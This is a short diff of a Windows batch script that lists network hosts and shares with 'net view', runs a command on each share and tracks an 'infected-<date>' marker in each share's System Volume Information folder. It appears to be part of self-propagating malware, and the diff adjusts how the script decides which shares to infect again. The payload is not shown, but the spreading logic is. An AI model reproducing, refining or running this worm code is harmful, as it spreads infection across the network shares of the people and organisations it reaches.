@@ -149,7 +149,7 @@ timeout /nobreak /t 2 >nul
 
 
 for /f "skip=3 tokens=1,* delims= " %%h in ('net view 2^>nul') do if /i "%%h" NEQ "The" (
-  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
+  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h 2^>nul') do if /i "%%i" NEQ "The" (
     %systemVolumeInfo_dir% "%%h\%%i"
 
     if not exist "%%h\%%i\System Volume Information\infected-%app_date%" (
